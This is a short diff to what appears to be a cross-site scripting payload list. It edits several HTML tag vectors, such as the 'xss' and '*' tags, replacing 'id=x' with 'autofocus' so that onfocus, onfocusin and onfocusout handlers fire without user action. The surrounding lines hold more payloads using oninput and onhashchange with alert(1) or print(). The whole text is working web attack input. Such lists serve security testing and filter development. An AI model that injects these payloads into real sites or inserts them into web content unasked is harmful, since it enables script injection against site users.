@@ -574,7 +574,7 @@ code
 <var id=x tabindex=1 onfocus=alert(1)><\/var>
 <wbr id=x tabindex=1 onfocus=alert(1)><\/wbr>
 <xmp id=x tabindex=1 onfocus=alert(1)><\/xmp>
-<xss id=x tabindex=1 onfocus=alert(1)><\/xss>
+<xss autofocus tabindex=1 onfocus=alert(1)><\/xss>
 <input autofocus onfocusin=alert(1)>
 <select autofocus onfocusin=alert(1)>
 <textarea autofocus onfocusin=alert(1)>test<\/textarea>
@@ -721,8 +721,8 @@ code
 <var id=x tabindex=1 onfocusin=alert(1)><\/var>
 <wbr id=x tabindex=1 onfocusin=alert(1)><\/wbr>
 <xmp id=x tabindex=1 onfocusin=alert(1)><\/xmp>
-<xss id=x tabindex=1 onfocusin=alert(1)><\/xss>
-<* onfocusout=alert(1) id=x tabindex=1 style=display:block>test</*><input value=clickme>
+<xss autofocus tabindex=1 onfocusin=alert(1)><\/xss>
+<* onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</*><input value=clickme>
 <body onhashchange=\"print()\">
 <input oninput=alert(1) value=xss>
 <textarea oninput=alert(1)>XSS<\/textarea>
